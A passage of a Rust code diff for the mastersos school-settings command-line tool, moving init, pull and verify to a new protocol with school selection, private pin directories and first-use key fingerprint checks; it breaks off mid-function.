@@ -15,6 +15,7 @@ use mastersos_bundle::{AgeBand, ClassRole, Kind, OrgRole};
 
 use crate::explain::{self as explain_mod, UserQuery};
 use crate::publish::SignWith;
+use crate::server::{CliError, SchoolEntry, Server};
 use crate::workdir::{self, Meta, Workdir};
 use crate::{call, check_server, connect, Api, OpError, Req};
 
@@ -60,6 +61,12 @@ pub struct Cli {
     #[cfg_attr(windows, doc = r"(default: %APPDATA%\mastersos\pins)")]
     #[arg(long, global = true, value_name = "DIR")]
     pin_dir: Option<PathBuf>,
+    /// Answer yes to every question: accept the key fingerprints the first time a school is checked (they are printed), and never read stdin to choose
+    #[arg(long, global = true)]
+    yes: bool,
+    /// The first time a school is checked without a person at the terminal (--yes): give each fingerprint shown on the School keys page; the keys must be exactly these
+    #[arg(long = "trust-fingerprint", global = true, value_name = "FP")]
+    trust_fingerprint: Vec<String>,
     #[command(subcommand)]
     cmd: Cmd,
 }
@@ -78,6 +85,9 @@ enum Cmd {
         /// A school key file, or `-` for the first line of stdin; give it once for each school key (two is good). Make one with `mastersos key new`, then register it with `mastersos key register`
         #[arg(long = "key-file", value_name = "PATH")]
         key_file: Vec<PathBuf>,
+        /// The school's id (a lowercase UUID); without it the schools you administer are listed and the only one is taken
+        #[arg(long, value_name = "UUID")]
+        school: Option<String>,
     },
     /// Download the latest published settings (checked on this computer, version by version) into a local directory
     Pull {
@@ -89,6 +99,9 @@ enum Cmd {
         /// Overwrite local changes that are not published
         #[arg(long)]
         force: bool,
+        /// The school's id (a lowercase UUID; default: `school_id` in the directory's mastersos.toml)
+        #[arg(long, value_name = "UUID")]
+        school: Option<String>,
     },
     /// Check the local settings directory the way publishing would (no network)
     Check {
@@ -139,7 +152,11 @@ enum Cmd {
     #[command(subcommand)]
     Key(KeyCmd),
     /// Check every published version on this computer (the first time, you confirm the key fingerprints)
-    Verify,
+    Verify {
+        /// The school's id (a lowercase UUID; default: `school_id` in ./mastersos.toml)
+        #[arg(long, value_name = "UUID")]
+        school: Option<String>,
+    },
     /// Monthly check-in: confirm to every computer that the latest settings are current
     Heartbeat {
         /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
@@ -388,13 +405,12 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
         server,
         token_file,
         json,
-        pin_dir,
+        pin_dir: pin_flag,
+        yes,
+        trust_fingerprint,
         cmd,
     } = cli;
-    if let Some(d) = pin_dir {
-        // Set once per process: `run` is called once.
-        let _ = PIN_DIR.set(d);
-    }
+    let pin_dir = || pin_dir_op(pin_flag.as_deref());
     // Sign-in commands: before the config file and the old server address are read.
     match &cmd {
         Cmd::Login { no_browser } => {
@@ -403,6 +419,20 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
         }
         Cmd::Logout => return Ok(finish(crate::auth::logout(json), json)),
         _ => {}
+    }
+    // Protocol v1 commands: credentials from arbella or `mastersos login`, no config file.
+    if matches!(
+        cmd,
+        Cmd::Init { .. } | Cmd::Pull { .. } | Cmd::Verify { .. }
+    ) {
+        let o = V1 {
+            json,
+            yes,
+            server: server.clone(),
+            pin_flag: pin_flag.clone(),
+            fingerprints: trust_fingerprint.clone(),
+        };
+        return Ok(finish(v1_command(&o, cmd).await, json));
     }
     if let Cmd::Connect { server_url } = &cmd {
         if server.is_some() {
@@ -416,15 +446,10 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
     }
     // Offline commands: no server address, no token.
     match &cmd {
-        Cmd::Check { dir } => return local_check(dir.as_deref(), json),
-        Cmd::Diff { dir } => return local_diff(dir.as_deref()),
+        Cmd::Check { dir } => return local_check(dir.as_deref(), &pin_dir()?, json),
+        Cmd::Diff { dir } => return local_diff(dir.as_deref(), &pin_dir()?),
         Cmd::Explain(c) => return explain(c, json),
-        Cmd::Migrate { dir, write } => return migrate(dir.as_deref(), *write, json),
-        // A directory with unpublished changes is refused before the network is touched.
-        Cmd::Pull { dir, force, .. } => {
-            let dir = dir.as_deref().unwrap_or_else(|| Path::new("."));
-            Workdir::ensure_pullable(dir, *force).map_err(fail)?;
-        }
+        Cmd::Migrate { dir, write } => return migrate(dir.as_deref(), &pin_dir()?, *write, json),
         Cmd::HashPassword => return hash_password(),
         Cmd::Key(KeyCmd::New { out, school }) => return key_new(out, school.as_deref()),
         Cmd::Logo(LogoCmd::Upload { login, icon }) => {
@@ -446,12 +471,6 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
             )
             .await
         }
-        Cmd::Init { key_file, .. } if key_file.is_empty() => {
-            return Err(OpError::Failed(
-                "mastersos init needs a school key file: --key-file <PATH>. Make one with: mastersos key new --out <FOLDER> --school <name>, then register it with mastersos key register --key-file <PATH> --label <name>."
-                    .into(),
-            ))
-        }
         // Settings are approved on this computer with the school key; nothing is uploaded without it.
         Cmd::Publish { key_file: None, .. } => {
             return Err(OpError::Failed(
@@ -462,7 +481,6 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
     }
     // School key files that cannot be read (not private, not a school key) stop before the network.
     let school_keys = match &cmd {
-        Cmd::Init { key_file, .. } => load_school_keys(key_file)?,
         Cmd::Key(KeyCmd::Add { file, .. }) => load_school_keys(std::slice::from_ref(file))?,
         _ => Vec::new(),
     };
@@ -515,17 +533,11 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
         | Cmd::Migrate { .. }
         | Cmd::HashPassword
         | Cmd::Key(KeyCmd::New { .. })
-        | Cmd::Key(KeyCmd::Remove { .. }) => {
+        | Cmd::Key(KeyCmd::Remove { .. })
+        | Cmd::Init { .. }
+        | Cmd::Pull { .. }
+        | Cmd::Verify { .. } => {
             unreachable!("handled above")
-        }
-        Cmd::Init { dir, .. } => init_dir(&api, &server, &token_file, &dir, &school_keys).await,
-        Cmd::Pull {
-            dir,
-            version,
-            force,
-        } => {
-            let dir = dir.unwrap_or_else(|| PathBuf::from("."));
-            pull_dir(&api, &server, &token_file, &dir, version, force).await
         }
         Cmd::Devices(c) => devices(&api, &out, c).await,
         Cmd::Spec { section, full } => spec(&api, section, full).await,
@@ -537,6 +549,7 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
                 &server,
                 &token_file,
                 dir.as_deref(),
+                &pin_dir()?,
                 sign_with.ok_or_else(|| fail("no school key"))?,
                 &allow_reroute,
                 json,
@@ -556,11 +569,11 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
         Cmd::Key(KeyCmd::Add { dir, .. }) => {
             keys_add(&api, &server, dir.as_deref(), &school_keys).await
         }
-        Cmd::Verify => verify(&server, &token_file).await,
         Cmd::Heartbeat { days, .. } => {
             heartbeat(
                 &server,
                 &token_file,
+                &pin_dir()?,
                 kit.ok_or_else(|| fail("no school key"))?,
                 days,
             )
@@ -577,7 +590,7 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
         }
         Cmd::Seed(SeedCmd::Check { .. }) => {
             let text = seed_text.ok_or_else(|| fail("no install file"))?;
-            seed_check(&server, &token_file, &text).await
+            seed_check(&server, &token_file, &pin_dir()?, &text).await
         }
         Cmd::Logo(LogoCmd::Upload { login, icon }) => {
             let body = logo_body(&login, &icon)?;
@@ -595,15 +608,25 @@ async fn run(cli: Cli) -> Result<ExitCode, OpError> {
     }
 }
 
-/// `--pin-dir`, when given.
-static PIN_DIR: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+/// Where the pins are kept: `--pin-dir`, else `pins` in this computer's settings folder. The
+/// directory is made private (0700; refused when it is a link or another user's).
+fn resolve_pin_dir(flag: Option<&Path>) -> Result<PathBuf, CliError> {
+    let local = |e: anyhow::Error| CliError::new("local_file", &format!("{e:#}"));
+    let dir = match flag {
+        Some(d) => d.to_path_buf(),
+        None => {
+            let cfg = crate::platform::config_dir("mastersos").map_err(local)?;
+            crate::platform::private_dir(&cfg, true).map_err(local)?;
+            cfg.join("pins")
+        }
+    };
+    crate::platform::private_dir(&dir, true).map_err(local)?;
+    Ok(dir)
+}
 
-/// Where the pins are kept: `--pin-dir`, else `pins` in this computer's settings folder.
-fn pin_dir() -> Result<PathBuf, OpError> {
-    match PIN_DIR.get() {
-        Some(d) => Ok(d.clone()),
-        None => Ok(config_dir()?.join("pins")),
-    }
+/// [`resolve_pin_dir`] for the commands that still report an [`OpError`].
+fn pin_dir_op(flag: Option<&Path>) -> Result<PathBuf, OpError> {
+    resolve_pin_dir(flag).map_err(|e| OpError::Failed(e.message))
 }
 
 /// An error of the signing code: it may hold strings from the server, so it is escaped.
@@ -656,35 +679,11 @@ async fn key_register(
     Ok(ExitCode::SUCCESS)
 }
 
-/// `mastersos verify`.
-async fn verify(server: &str, token_file: &Path) -> Result<ExitCode, OpError> {
-    let api = sign_api(server, token_file)?;
-    let v = crate::sign::chain::verify_chain(
-        &api,
-        &pin_dir()?,
-        &mut std::io::stdin().lock(),
-        &mut std::io::stdout(),
-    )
-    .await
-    .map_err(sign_fail)?;
-    if v.latest != v.version {
-        println!(
-            "Verified up to version {}; computers accept up to version {}. Its trusted keys:",
-            v.latest, v.version
-        );
-    } else {
-        println!("Verified up to version {}. Trusted keys:", v.version);
-    }
-    for k in &v.trust {
-        println!("    {}", crate::sign::key_line(k));
-    }
-    Ok(ExitCode::SUCCESS)
-}
-
 /// `mastersos heartbeat`.
 async fn heartbeat(
     server: &str,
     token_file: &Path,
+    pins: &Path,
     kit: &mastersos_bundle::kit::Kit,
     days: i64,
 ) -> Result<ExitCode, OpError> {
@@ -692,7 +691,7 @@ async fn heartbeat(
     crate::sign::sign_heartbeat(
         &api,
         kit,
-        &pin_dir()?,
+        pins,
         days,
         &mut std::io::stdin().lock(),
         &mut std::io::stdout(),
@@ -718,9 +717,14 @@ async fn recovery_read(
 }
 
 /// `mastersos seed check <FILE>`, with the file's text (read before the network).
-async fn seed_check(server: &str, token_file: &Path, text: &str) -> Result<ExitCode, OpError> {
+async fn seed_check(
+    server: &str,
+    token_file: &Path,
+    pins: &Path,
+    text: &str,
+) -> Result<ExitCode, OpError> {
     let api = sign_api(server, token_file)?;
-    crate::sign::seed_check(&api, &pin_dir()?, text, &mut std::io::stdout())
+    crate::sign::seed_check(&api, pins, text, &mut std::io::stdout())
         .await
         .map_err(sign_fail)?;
     Ok(ExitCode::SUCCESS)
@@ -932,10 +936,10 @@ fn fail(e: impl std::fmt::Display) -> OpError {
 }
 
 /// The settings directory, its base checked against this computer's pins.
-fn open_dir(dir: Option<&Path>) -> Result<Workdir, OpError> {
+fn open_dir(dir: Option<&Path>, pins: &Path) -> Result<Workdir, OpError> {
     Ok(Workdir::open(dir.unwrap_or_else(|| Path::new(".")))
         .map_err(fail)?
-        .with_pins(pin_dir()?))
+        .with_pins(pins))
 }
 
 fn lint_values(lints: &[mastersos_bundle::Lint]) -> Vec<Value> {
@@ -971,8 +975,8 @@ fn reroute_notice(lints: &[mastersos_bundle::Lint]) -> Option<String> {
 }
 
 /// `mastersos check`: the lints of the local directory; exit code 2 when any is an error.
-fn local_check(dir: Option<&Path>, json: bool) -> Result<ExitCode, OpError> {
-    let lints = workdir::check(&open_dir(dir)?).map_err(fail)?;
+fn local_check(dir: Option<&Path>, pins: &Path, json: bool) -> Result<ExitCode, OpError> {
+    let lints = workdir::check(&open_dir(dir, pins)?).map_err(fail)?;
     if json {
         println!("{}", crate::tools::check_result(&lints));
     } else {
@@ -989,8 +993,8 @@ fn local_check(dir: Option<&Path>, json: bool) -> Result<ExitCode, OpError> {
 }
 
 /// `mastersos diff`.
-fn local_diff(dir: Option<&Path>) -> Result<ExitCode, OpError> {
-    print!("{}", workdir::diff(&open_dir(dir)?).map_err(fail)?);
+fn local_diff(dir: Option<&Path>, pins: &Path) -> Result<ExitCode, OpError> {
+    print!("{}", workdir::diff(&open_dir(dir, pins)?).map_err(fail)?);
     Ok(ExitCode::SUCCESS)
 }
 
@@ -999,7 +1003,7 @@ fn local_diff(dir: Option<&Path>) -> Result<ExitCode, OpError> {
 fn local_manifest(
     dir: Option<&Path>,
 ) -> Result<(Workdir, String, mastersos_bundle::Manifest), OpError> {
-    let w = open_dir(dir)?;
+    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
     let text = w.manifest().map_err(fail)?;
     let m = mastersos_bundle::check::parse_draft(&text).map_err(|l| OpError::Refused {
         message: "manifest.toml does not parse (see `mastersos check`)".into(),
@@ -1163,8 +1167,8 @@ fn migrate_notes(legacy: bool) -> String {
 
 /// `mastersos migrate`: the format 3 text on stdout (or written with `--write`), then the local
 /// check of that text; exit code 2 when the check finds errors or the text is already format 3.
-fn migrate(dir: Option<&Path>, write: bool, json: bool) -> Result<ExitCode, OpError> {
-    let w = open_dir(dir)?;
+fn migrate(dir: Option<&Path>, pins: &Path, write: bool, json: bool) -> Result<ExitCode, OpError> {
+    let w = open_dir(dir, pins)?;
     let text = w.manifest().map_err(fail)?;
     let new = mastersos_bundle::migrate::to_format3(&text).map_err(|e| match e {
         mastersos_bundle::migrate::MigrateError::AlreadyFormat3 => OpError::Refused {
@@ -1215,11 +1219,6 @@ fn migrate(dir: Option<&Path>, write: bool, json: bool) -> Result<ExitCode, OpEr
     })
 }
 
-/// The school id the server says this token belongs to.
-async fn school_id(api: &Api) -> Result<String, OpError> {
-    Ok(school_info(api, "").await?.0)
-}
-
 /// The school id and name the server says this token belongs to (the name for messages only; the
 /// host when there is none).
 async fn school_info(api: &Api, server: &str) -> Result<(String, String), OpError> {
@@ -1267,51 +1266,6 @@ fn same_server(a: &str, b: &str) -> bool {
         (Some(x), Some(y)) => x == y,
         _ => a == b,
     }
-}
-
-/// `mastersos init <dir> --key-file <PATH>…`: the trusted keys and the disk-unlocking
-/// recipients come from the school key files only; the server is asked only whether each is
-/// registered for this school. Nothing is written when one is not.
-async fn init_dir(
-    api: &Api,
-    server: &str,
-    token_file: &Path,
-    dir: &Path,
-    school_keys: &[SchoolKey],
-) -> Result<ExitCode, OpError> {
-    let (id, name) = school_info(api, server).await?;
-    let latest = sign_api(server, token_file)?
-        .latest_version()
-        .await
-        .map_err(fail)?;
-    if latest > 0 {
-        return Err(OpError::Failed(format!(
-            "the school already has published settings (version {latest}): use `mastersos pull {}`",
-            dir.display()
-        )));
-    }
-    ensure_registered(api, school_keys, &name).await?;
-    let keys: Vec<(mastersos_bundle::TrustKey, String)> = school_keys
-        .iter()
-        .map(|k| (k.kit.trust_key(), k.kit.escrow_recipient()))
-        .collect();
-    let text =
-        workdir::set_trusted_keys(&workdir::template(&id).map_err(fail)?, &keys).map_err(fail)?;
-    let meta = Meta {
-        server: server.to_owned(),
-        school_id: id,
-        base_version: 0,
-    };
-    Workdir::init(dir, meta, &text).map_err(fail)?;
-    let abs = absolute(dir)?;
-    println!("Created {} for {name}.", abs.display());
-    println!("  manifest.toml  the settings for every computer: edit this file");
-    println!(
-        "  secrets.toml   Wi-Fi passwords and other secrets that manifest.toml names as \"secret:<name>\"; keep it private"
-    );
-    println!("{}", trusted_line(&text)?);
-    println!("Next: edit manifest.toml, then run `mastersos check`.");
-    Ok(ExitCode::SUCCESS)
 }
 
 /// A school key file read for `init` or `key add`.
@@ -1638,78 +1592,382 @@ async fn keys_list(api: &Api, out: &Out, dir: Option<&Path>) -> Result<ExitCode,
     Ok(ExitCode::SUCCESS)
 }
 
-/// `mastersos pull`: the chain is verified from the pin first; an older `--version` is taken only
-/// if this computer verified it before (the pin's recorded digest).
-async fn pull_dir(
-    api: &Api,
-    server: &str,
-    token_file: &Path,
+// —— Protocol v1: init, pull, verify ——
+
+/// The global options the protocol v1 commands use.
+struct V1 {
+    json: bool,
+    yes: bool,
+    server: Option<String>,
+    pin_flag: Option<PathBuf>,
+    /// `--trust-fingerprint`.
+    fingerprints: Vec<String>,
+}
+
+impl V1 {
+    /// The first-use anchors of a command without a school key file: the fingerprints given, or
+    /// a person at a terminal (not with `--yes`).
+    fn anchors(&self) -> crate::sign::chain::Anchors {
+        use std::io::IsTerminal as _;
+        crate::sign::chain::Anchors {
+            keys: Vec::new(),
+            fingerprints: self.fingerprints.clone(),
+            interactive: !self.yes && std::io::stdin().is_terminal(),
+        }
+    }
+}
+
+/// Run `init`, `pull` or `verify`: what to print on stdout, or the error. With `--json` the
+/// dialogue (fingerprints, chain notes) goes to stderr and stdout holds one JSON value.
+async fn v1_command(o: &V1, cmd: Cmd) -> Result<String, CliError> {
+    use std::io::IsTerminal as _;
+    // School key files first: `--key-file -` reads stdin, before the dialogue holds it.
+    let keys = match &cmd {
+        Cmd::Init { key_file, .. } if key_file.is_empty() => {
+            return Err(CliError::usage(
+                "mastersos init needs a school key file: --key-file <PATH>. Make one with: mastersos key new --out <FOLDER> --school <name>, then register it with mastersos key register --key-file <PATH> --label <name>.",
+            ))
+        }
+        Cmd::Init { key_file, .. } => load_school_keys(key_file)
+            .map_err(|e| CliError::new("key_file_invalid", e.message()))?,
+        _ => Vec::new(),
+    };
+    let stdin = std::io::stdin();
+    let interactive = !o.yes && !o.json && stdin.is_terminal();
+    let mut confirm = stdin.lock();
+    let (mut stdout, mut stderr) = (std::io::stdout(), std::io::stderr());
+    let out: &mut dyn std::io::Write = if o.json { &mut stderr } else { &mut stdout };
+    match cmd {
+        Cmd::Init { dir, school, .. } => {
+            init_v1(
+                o,
+                &dir,
+                keys,
+                school.as_deref(),
+                interactive,
+                &mut confirm,
+                out,
+            )
+            .await
+        }
+        Cmd::Pull {
+            dir,
+            version,
+            force,
+            school,
+        } => {
+            let dir = dir.unwrap_or_else(|| PathBuf::from("."));
+            pull_v1(
+                o,
+                &dir,
+                version,
+                force,
+                school.as_deref(),
+                &mut confirm,
+                out,
+            )
+            .await
+        }
+        Cmd::Verify { school } => verify_v1(o, school.as_deref(), &mut confirm, out).await,
+        _ => Err(CliError::usage("not a protocol v1 command")),
+    }
+}
+
+/// A local file problem; the message names the file, never its content.
+fn local_file(e: impl std::fmt::Display) -> CliError {
+    CliError::new("local_file", &crate::safe::text(&format!("{e:#}")))
+}
+
+/// The origin of a server address, as `--server` takes it.
+fn origin_of(s: &str) -> Result<String, CliError> {
+    Ok(crate::server::check_origin(s)?
+        .origin()
+        .ascii_serialization())
+}
+
+/// The `mastersos.toml` of `dir`, when it is a settings directory. Its server must be an origin
+/// and its school a lowercase UUID: a directory of the old admin API is refused.
+fn dir_meta(dir: &Path) -> Result<Option<Meta>, CliError> {
+    match std::fs::symlink_metadata(dir.join("mastersos.toml")) {
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
+        _ => {}
+    }
+    let m = Workdir::open(dir)
+        .and_then(|w| w.meta())
+        .map_err(local_file)?;
+    let old = || {
+        CliError::new(
+            "local_file",
+            &format!(
+                "{} is from an older version of mastersos (its server is not an origin, or its school id is not a lowercase UUID): pull into a new directory",
+                dir.join("mastersos.toml").display()
+            ),
+        )
+    };
+    if origin_of(&m.server).map_err(|_| old())? != m.server
+        || !crate::server::is_school_id(&m.school_id)
+    {
+        return Err(old());
+    }
+    Ok(Some(m))
+}
+
+/// The credentials and the server origin: `--server`, else the directory's server, else the one
+/// the credentials name. The credentials must be for that server.
+async fn resolve_v1(
+    o: &V1,
+    meta: Option<&Meta>,
+) -> Result<(crate::auth::Credentials, String), CliError> {
+    let flag = o.server.as_deref().map(origin_of).transpose()?;
+    if let (Some(f), Some(m)) = (&flag, meta) {
+        if *f != m.server {
+            return Err(CliError::new(
+                "school_mismatch",
+                &format!("the directory belongs to {}, not to {f}", m.server),
+            ));
+        }
+    }
+    let wanted = flag.or_else(|| meta.map(|m| m.server.clone()));
+    let (creds, named) = crate::auth::resolve(wanted.as_deref()).await?;
+    let origin = wanted.or(named).ok_or_else(|| {
+        CliError::new(
+            "not_configured",
+            "no server: pass --server <URL>, or sign in with `mastersos login --server <URL>`",
+        )
+    })?;
+    Ok((creds, origin))
+}
+
+/// The school `--school` names, else the directory's; they must agree.
+fn school_of(flag: Option<&str>, meta: Option<&Meta>) -> Result<String, CliError> {
+    match (flag, meta) {
+        (Some(f), Some(m)) if f != m.school_id => Err(CliError::new(
+            "school_mismatch",
+            &format!(
+                "the directory belongs to school {}, not to {f}",
+                m.school_id
+            ),
+        )),
+        (Some(f), _) => Ok(f.to_owned()),
+        (None, Some(m)) => Ok(m.school_id.clone()),
+        (None, None) => Err(CliError::new(
+            "not_configured",
+            "no school is set: pass --school <UUID>",
+        )),
+    }
+}
+
+/// The school `init` works on when `--school` is not given (R8): none is an error, one is taken,
+/// several are asked for by number, or refused with the list when there is no one to ask.
+pub(crate) fn choose_school(
+    list: Vec<SchoolEntry>,
+    interactive: bool,
+    confirm: &mut dyn std::io::BufRead,
+    out: &mut dyn std::io::Write,
+) -> Result<SchoolEntry, CliError> {
+    let shown = |s: &SchoolEntry| format!("{}  {}", s.id, crate::safe::field(&s.name));
+    match list.len() {
+        0 => Err(CliError::new(
+            "not_configured",
+            "this account administers no school",
+        )),
+        1 => {
+            let s = list
+                .into_iter()
+                .next()
+                .ok_or_else(|| CliError::usage("no school"))?;
+            writeln!(out, "School: {}", shown(&s)).map_err(local_file)?;
+            Ok(s)
+        }
+        n if !interactive => {
+            let mut e = CliError::usage(&format!(
+                "this account administers {n} schools: pass --school <UUID> with one of them"
+            ));
+            e.problems = list
+                .iter()
+                .map(|s| serde_json::Value::String(shown(s)))
+                .collect();
+            Err(e)
+        }
+        n => {
+            writeln!(out, "This account administers {n} schools:").map_err(local_file)?;
+            for (i, s) in list.iter().enumerate() {
+                writeln!(out, "  {}. {}", i + 1, shown(s)).map_err(local_file)?;
+            }
+            let typed = crate::sign::ask(confirm, out, "Type the number of the school: ")
+                .map_err(|_| CliError::new("cancelled", "no school was chosen; cancelled"))?;
+            match typed.parse::<usize>() {
+                Ok(i) if (1..=n).contains(&i) => Ok(list
+                    .into_iter()
+                    .nth(i - 1)
+                    .ok_or_else(|| CliError::usage("no school"))?),
+                _ => Err(CliError::usage(&format!(
+                    "{} is not a number from 1 to {n}",
+                    crate::safe::field(&typed)
+                ))),
+            }
+        }
+    }
+}
+
+/// `GET keys`, as far as `init` reads it.
+#[derive(Deserialize)]
+struct RegisteredKey {
+    key_id: String,
+    #[serde(default)]
+    public_key: String,
+    #[serde(default)]
+    fingerprint: String,
+}
+
+/// `mastersos init DIR --key-file PATH… [--school UUID] [--server URL]`: the trusted keys and the
+/// disk-unlocking recipients come from the school key files only; the server is asked only
+/// whether each key is registered (same id, public key and fingerprint). Nothing is written when
+/// one is not.
+async fn init_v1(
+    o: &V1,
+    dir: &Path,
+    keys: Vec<SchoolKey>,
+    school: Option<&str>,
+    interactive: bool,
+    confirm: &mut dyn std::io::BufRead,
+    out: &mut dyn std::io::Write,
+) -> Result<String, CliError> {
+    if !workdir::is_free(dir).map_err(local_file)? {
+        return Err(CliError::usage(&format!(
+            "{} is not empty: init starts a new directory",
+            dir.display()
+        )));
+    }
+    let (creds, origin) = resolve_v1(o, None).await?;
+    let (school, name) = match school {
+        Some(s) => (s.to_owned(), None),
+        None => {
+            let list = Server::new(&origin, None, creds.clone())?.schools().await?;
+            let s = choose_school(list, interactive, confirm, out)?;
+            (s.id, Some(s.name))
+        }
+    };
+    let server = Server::new(&origin, Some(&school), creds)?;
+    let latest = server.latest_version().await?;
+    if latest > 0 {
+        return Err(CliError::new(
+            "version_conflict",
+            &format!(
+                "the school already has published settings (version {latest}): use `mastersos pull {}`",
+                dir.display()
+            ),
+        ));
+    }
+    let registered: Vec<RegisteredKey> = server.get_json("keys").await?;
+    for k in &keys {
+        let tk = k.kit.trust_key();
+        let fp = mastersos_bundle::trust_fingerprint(&tk);
+        let ok = registered
+            .iter()
+            .any(|r| r.key_id == tk.id && r.public_key == tk.public_key && r.fingerprint == fp);
+        if !ok {
+            return Err(CliError::new(
+                "key_not_trusted",
+                &format!(
+                    "school key {} is not registered for school {school}. Register it first with `mastersos key register --key-file <file> --label <name>`.",
+                    k.code()
+                ),
+            ));
+        }
+    }
+    let pairs: Vec<(mastersos_bundle::TrustKey, String)> = keys
+        .iter()
+        .map(|k| (k.kit.trust_key(), k.kit.escrow_recipient()))
+        .collect();
+    let text = workdir::set_trusted_keys(&workdir::template(&school).map_err(local_file)?, &pairs)
+        .map_err(local_file)?;
+    let meta = Meta {
+        server: origin.clone(),
+        school_id: school.clone(),
+        base_version: 0,
+    };
+    Workdir::init(dir, meta, &text).map_err(local_file)?;
+    let abs = std::path::absolute(dir).map_err(local_file)?;
+    let codes: Vec<String> = keys.iter().map(SchoolKey::code).collect();
+    if o.json {
+        return Ok(format!(
+            "{}\n",
+            json!({"created": abs.display().to_string(), "server": origin, "school_id": school, "trusted_keys": codes})
+        ));
+    }
+    let whose = match name {
+        Some(n) => crate::safe::field(&n),
+        None => format!("school {school}"),
+    };
+    Ok(format!(
+        "Created {} for {whose}.\n  manifest.toml  the settings for every computer: edit this file\n  secrets.toml   Wi-Fi passwords and other secrets that manifest.toml names as \"secret:<name>\"; keep it private\n{}\nNext: edit manifest.toml, then run `mastersos check`.\n",
+        abs.display(),
+        trusted_line(&text).map_err(|e| local_file(e.message()))?
+    ))
+}
+
+/// `mastersos pull [DIR] [--version N] [--force] [--school UUID] [--server URL]`: the chain is
+/// verified from the pin first; an older `--version` is taken only if this computer verified it
+/// before (the pin's recorded digest).
+async fn pull_v1(
+    o: &V1,
     dir: &Path,
     version: Option<u64>,
     force: bool,
-) -> Result<ExitCode, OpError> {
-    // (`run` already refused a dirty directory before connecting.)
-    let id = school_id(api).await?;
-    let mut anchor = id.clone();
-    if let Ok(w) = Workdir::open(dir) {
-        let m = w.meta().map_err(fail)?;
-        anchor = m.school_id.clone();
-        if m.school_id != id || !same_server(&m.server, server) {
-            return Err(OpError::Failed(format!(
-                "{} belongs to school {} on {}, not to {id} on {server}",
-                dir.display(),
-                m.school_id,
-                m.server
-            )));
-        }
-    }
-    let sign = sign_api(server, token_file)?;
-    let pins = pin_dir()?;
-    let verified = crate::sign::chain::verify_chain(
-        &sign,
-        &pins,
-        &mut std::io::stdin().lock(),
-        &mut std::io::stdout(),
-    )
-    .await
-    .map_err(fail)?;
+    school: Option<&str>,
+    confirm: &mut dyn std::io::BufRead,
+    out: &mut dyn std::io::Write,
+) -> Result<String, CliError> {
+    // A directory with unpublished changes is refused before the network is touched.
+    Workdir::ensure_pullable(dir, force).map_err(|e| CliError::usage(&format!("{e:#}")))?;
+    let meta = if force {
+        dir_meta(dir).ok().flatten()
+    } else {
+        dir_meta(dir)?
+    };
+    let school = school_of(school, meta.as_ref())?;
+    let (creds, origin) = resolve_v1(o, meta.as_ref()).await?;
+    let server = Server::new(&origin, Some(&school), creds)?;
+    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
+    let verified =
+        crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
+            .await?;
     let (n, contents) = match version {
         None => (verified.version, verified.contents),
         Some(n) if n == verified.version => (n, verified.contents),
         // Newer than what machines run: refused versions (or none), not something to pull.
         Some(n) if n == 0 || n > verified.version => {
-            return Err(OpError::Failed(format!(
+            return Err(CliError::usage(&format!(
             "version {n} cannot be pulled: machines run version {} (the newest published is {})",
             verified.version, verified.latest
         )))
         }
         Some(n) => {
-            // Only a version this computer verified before, with the digest it had then: the
-            // manifests link to no earlier digest, so history before the first use here cannot
-            // be authenticated.
-            crate::sign::chain::recorded_version(&verified.history, n).map_err(fail)?;
-            let archive = sign.version_archive(n).await.map_err(fail)?;
+            // Only a version this computer verified before, with the digest it had then.
+            crate::sign::chain::recorded_version(&verified.history, n)
+                .map_err(|e| CliError::usage(&format!("{e:#}")))?;
+            let archive = server.version_archive(n).await?;
             let contents = crate::sign::chain::recorded_contents(&verified.history, n, &archive)
-                .map_err(fail)?;
+                .map_err(crate::sign::chain::to_cli_error)?;
             (n, contents)
         }
     };
-    let manifest = mastersos_bundle::Manifest::parse(&contents.manifest_text)
-        .map_err(|e| OpError::Failed(format!("version {n}: the manifest cannot be read: {e}")))?;
-    // The directory's own school id (written by `init` or an earlier `pull`) is the local anchor;
-    // the server's answer must agree as well.
-    for expected in [&anchor, &id] {
-        if mastersos_bundle::school_id_mismatch(&manifest, expected).is_some() {
-            return Err(OpError::Failed(format!(
-                "version {n} belongs to a different school than {expected}"
-            )));
-        }
+    let manifest = mastersos_bundle::Manifest::parse(&contents.manifest_text).map_err(|e| {
+        CliError::new(
+            "chain_tampered",
+            &format!(
+                "version {n}: the manifest cannot be read: {}",
+                crate::safe::field(&e.to_string())
+            ),
+        )
+    })?;
+    if mastersos_bundle::school_id_mismatch(&manifest, &school).is_some() {
+        return Err(CliError::new(
+            "school_mismatch",
+            &format!("version {n} belongs to a different school than {school}"),
+        ));
     }
-    let meta = Meta {
-        server: server.to_owned(),
-        school_id: id,
-        base_version: n,
-    };
     // A directory that differs from its base is replaced only if it is exactly what was uploaded
     // and that upload is the version just verified (same digest): then it was published.
     let mut overwrite = force;
@@ -1718,16 +1976,67 @@ async fn pull_dir(
             && n == verified.latest
             && Workdir::is_published_upload(dir, n, &verified.digest_hex).unwrap_or(false);
         if !published {
-            return Err(OpError::Failed(format!(
+            return Err(CliError::usage(&format!(
                 "{} has changes that are not published (see `mastersos diff`); pull again with --force to throw them away",
                 dir.display()
             )));
         }
         overwrite = true;
     }
-    Workdir::write_pulled(dir, meta, &contents, overwrite).map_err(fail)?;
-    println!("Pulled version {n} into {}.", dir.display());
-    Ok(ExitCode::SUCCESS)
+    let meta = Meta {
+        server: origin.clone(),
+        school_id: school.clone(),
+        base_version: n,
+    };
+    Workdir::write_pulled(dir, meta, &contents, overwrite).map_err(local_file)?;
+    if o.json {
+        let abs = std::path::absolute(dir).map_err(local_file)?;
+        return Ok(format!(
+            "{}\n",
